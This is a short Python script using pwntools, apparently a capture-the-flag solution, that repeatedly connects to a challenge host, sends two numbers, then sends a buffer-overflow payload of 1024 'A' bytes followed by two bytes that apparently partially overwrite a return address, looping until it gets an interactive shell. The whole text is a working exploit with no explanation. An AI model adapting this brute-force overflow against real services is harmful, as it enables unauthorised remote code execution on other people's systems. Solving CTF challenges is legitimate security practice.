from pwn import *
import time
import random


while True:
    try:
        r = remote("importantservice.uni.hctf.fun", 13375)
        r.recvline()
        r.sendline("1026 4186128")
        r.recvline()
        payload = "A" * 1024 + "\xa9\x91"
        r.sendline(payload)
        r.interactive()
    except:
        time.sleep(0.1)
        pass
